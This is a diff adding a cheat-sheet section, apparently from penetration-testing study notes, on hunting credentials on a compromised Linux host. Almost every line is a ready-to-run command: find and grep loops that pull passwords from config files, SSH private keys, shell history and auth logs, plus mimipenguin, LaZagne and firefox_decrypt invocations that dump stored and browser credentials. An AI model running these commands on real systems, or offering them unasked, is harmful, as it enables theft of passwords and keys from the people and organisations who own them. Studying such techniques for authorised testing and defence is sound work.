@@ -156,4 +156,24 @@
 # Linux Local Password Attacks
 
 ## Credential Hunting in Linux
-
+- Search for config files: `for l in $(echo ".conf .config .cnf");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "lib\|fonts\|share\|core" ;done`
+- Find creds in config files: `for i in $(find / -name *.cnf 2>/dev/null | grep -v "doc\|lib");do echo -e "\nFile: " $i; grep "user\|password\|pass" $i 2>/dev/null | grep -v "\#";done`
+- Find databases: `for l in $(echo ".sql .db .*db .db*");do echo -e "\nDB File extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share\|man";done`
+- Find info on system: `find /home/* -type f -name "*.txt" -o ! -name "*.*"`
+- Find scripts: `for l in $(echo ".py .pyc .pl .go .jar .c .sh");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share";done`
+- Check out the crontab: `cat /etc/crontab ` and `ls -la /etc/cron.*/`
+- Find SSH Private Keys: `grep -rnw "PRIVATE KEY" /home/* 2>/dev/null | grep ":1"`
+- Find SSH Public Keys: `grep -rnw "ssh-rsa" /home/* 2>/dev/null | grep ":1"`
+- Find command history: `tail -n5 /home/*/.bash*`
+- Find interesting data in logs: `for i in $(ls /var/log/* 2>/dev/null);do GREP=$(grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null); if [[ $GREP ]];then echo -e "\n#### Log file: " $i; grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null;fi;done`
+- We can use `mimipenguin` to find creds:
+  - `sudo python3 mimipenguin.py`
+  - `sudo bash mimipenguin.sh`
+- We can also use LaZagne: `sudo python2.7 laZagne.py all`
+- Creds are often stored in the browser by users
+  - Firefox
+    - `ls -l .mozilla/firefox/ | grep default `
+    - `cat .mozilla/firefox/1bplpd86.default-release/logins.json | jq .`
+    - `python3.9 firefox_decrypt.py`
+  - `python3 laZagne.py browsers`
+  - 
